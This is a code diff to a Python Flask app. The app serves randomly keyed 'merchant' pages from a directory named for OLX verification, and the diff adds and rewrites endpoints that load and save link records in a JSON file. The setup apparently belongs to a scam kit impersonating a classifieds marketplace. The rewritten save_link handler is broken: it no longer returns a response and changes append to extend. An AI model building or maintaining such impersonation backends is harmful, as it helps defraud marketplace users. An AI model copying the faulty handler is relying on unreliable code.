@@ -68,32 +68,39 @@ def serve_merchant_page(random_id):
     merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
     return send_from_directory(merchant_path, 'index.html')
 
+@app.route('/load_links', methods=['GET'])
+def load_links():
+    links_file = '/home/user/app/data/links.json'
+
+    if os.path.exists(links_file):
+        with open(links_file, 'r', encoding='utf-8') as file:
+            links = json.load(file)
+    else:
+        links = []
+
+    return jsonify(links), 200
+
 @app.route('/save_link', methods=['POST'])
 def save_link():
-    data = request.json
-    if not data:
+    link_data = request.get_json()
+    if not link_data:
         return jsonify({'error': 'No data provided'}), 400
-    
-    links_file_path = '/home/user/app/data/links.json'
-    
-    # Создаем директорию, если она не существует
-    os.makedirs(os.path.dirname(links_file_path), exist_ok=True)
+
+    links_file = '/home/user/app/data/links.json'
 
     # Загружаем существующие данные
-    if os.path.exists(links_file_path):
-        with open(links_file_path, 'r', encoding='utf-8') as file:
+    if os.path.exists(links_file):
+        with open(links_file, 'r', encoding='utf-8') as file:
             links = json.load(file)
     else:
         links = []
 
     # Добавляем новые данные
-    links.append(data)
-    
-    # Сохраняем обновленные данные
-    with open(links_file_path, 'w', encoding='utf-8') as file:
-        json.dump(links, file, ensure_ascii=False, indent=4)
-    
-    return jsonify({'message': 'Link saved successfully'}), 200
+    links.extend(link_data)
+
+    # Сохраняем данные обратно в файл
+    with open(links_file, 'w', encoding='utf-8') as file:
+        json.dump(links, file, indent=4, ensure_ascii=False)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
